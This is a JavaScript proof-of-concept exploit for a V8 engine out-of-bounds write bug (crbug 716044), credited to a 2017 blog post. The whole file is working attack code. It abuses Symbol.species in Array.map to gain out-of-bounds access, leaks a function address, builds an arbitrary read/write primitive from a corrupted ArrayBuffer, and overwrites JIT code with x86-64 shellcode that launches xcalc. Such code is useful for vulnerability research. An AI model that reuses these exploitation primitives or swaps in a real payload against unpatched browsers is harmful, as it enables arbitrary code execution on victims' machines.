// Source: https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/
//
// v8 exploit for https://crbug.com/716044
var oob_rw = null;
var leak = null;
var arb_rw = null;

var code = function() {
  return 1;
}
code();

class BuggyArray extends Array {
  constructor(len) {
    super(1);
    oob_rw = new Array(1.1, 1.1);
    leak = new Array(code);
    arb_rw = new ArrayBuffer(4);
  }
};

class MyArray extends Array {
  static get [Symbol.species]() {
    return BuggyArray;
  }
}

var convert_buf = new ArrayBuffer(8);
var float64 = new Float64Array(convert_buf);
var uint8 = new Uint8Array(convert_buf);
var uint32 = new Uint32Array(convert_buf);

function Uint64Add(dbl, to_add_int) {
  float64[0] = dbl;
  var lower_add = uint32[0] + to_add_int;
  if (lower_add > 0xffffffff) {
    lower_add &= 0xffffffff;
    uint32[1] += 1;
  }
  uint32[0] = lower_add;
  return float64[0];
}

// Memory layout looks like this:
// ================================================================================
// |a_ BuggyArray (0x80) | a_ FixedArray (0x18) | oob_rw JSArray (0x30)           |
// --------------------------------------------------------------------------------
// |oob_rw FixedDoubleArray (0x20) | leak JSArray (0x30) | leak FixedArray (0x18) |
// --------------------------------------------------------------------------------
// |arb_rw ArrayBuffer |
// ================================================================================
var myarray = new MyArray();
myarray.length = 9;
myarray[4] = 42;
myarray[8] = 42;
myarray.map(function(x) { return 1000000; });

var js_function_addr = oob_rw[10];  // JSFunction for code()

// Set arb_rw's kByteLengthOffset to something big.
uint32[0] = 0;
uint32[1] = 1000000;
oob_rw[14] = float64[0];
// Set arb_rw's kBackingStoreOffset to
// js_function_addr + JSFunction::kCodeEntryOffset - 1
// (to get rid of Object tag)
oob_rw[15] = Uint64Add(js_function_addr, 56-1);

var js_function_uint32 = new Uint32Array(arb_rw);
uint32[0] = js_function_uint32[0];
uint32[1] = js_function_uint32[1];
oob_rw[15] = Uint64Add(float64[0], 128); // 128 = code header size

// pop /usr/bin/xcalc
var shellcode = new Uint32Array(arb_rw);
shellcode[0] = 0x90909090;
shellcode[1] = 0x90909090;
shellcode[2] = 0x782fb848;
shellcode[3] = 0x636c6163;
shellcode[4] = 0x48500000;
shellcode[5] = 0x73752fb8;
shellcode[6] = 0x69622f72;
shellcode[7] = 0x8948506e;
shellcode[8] = 0xc03148e7;
shellcode[9] = 0x89485750;
shellcode[10] = 0xd23148e6;
shellcode[11] = 0x3ac0c748;
shellcode[12] = 0x50000030;
shellcode[13] = 0x4944b848;
shellcode[14] = 0x414c5053;
shellcode[15] = 0x48503d59;
shellcode[16] = 0x3148e289;
shellcode[17] = 0x485250c0;
shellcode[18] = 0xc748e289;
shellcode[19] = 0x00003bc0;
shellcode[20] = 0x050f00;
code();
